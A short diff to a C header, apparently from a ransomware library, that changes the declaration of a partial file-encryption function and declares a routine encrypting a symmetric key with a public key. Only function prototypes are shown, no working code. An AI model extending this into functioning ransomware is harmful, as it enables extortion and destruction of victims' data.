@@ -4,6 +4,8 @@
 */
 #ifndef RANSOMLIB_HEADER
 	#define RANSOMLIB_HEADER 1
+	#include <stdbool.h>
+	#include <stdint.h>
 	int encryptSymmetricKey(char** encrypted_key, const int pubkeyid, const char* key);
-	void partialEncryptFile(const char* key, const char* filename, const unsigned int bytes);
+	bool partialEncryptFile(const char* key,const char* iv, const char* filename, int64_t number_of_bytes);
 #endif
